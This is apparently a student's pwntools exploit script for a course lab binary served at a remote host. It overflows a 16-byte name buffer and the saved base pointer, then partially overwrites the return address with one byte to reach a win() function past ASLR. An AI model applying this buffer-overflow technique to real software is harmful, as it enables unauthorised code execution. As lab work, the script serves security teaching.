#!/usr/bin/python3
# 2022.09.29.0942.EST
from pwn import *

overflow = b"A"*16 + b"B"*8    # Overflow char name[16] and then overflow the base pointer

# The offset from base to win() is 0x13cb bytes. However the first byte in that offset will change due to ASLR
# This means we only need to use the last byte 0xcb to overwrite the return address on the stack to point to win()
win_offset = b"\xcb"

with remote("csc748.hostbin.org", 7052) as p:
#with gdb.debug("./lab5-2.bin") as p:
    payload = b""
    payload += overflow
    payload += win_offset
    payload += b"\n"    # This will not be added to the stack since get_string(char *s) breaks on newline before adding it to the passed pointer

    p.recv()    # printf("Hello! What's your name?: ")
    p.send(payload)
    banner = p.recv()    # printf("Nice to meet you %s!\n", name)
    p.interactive()
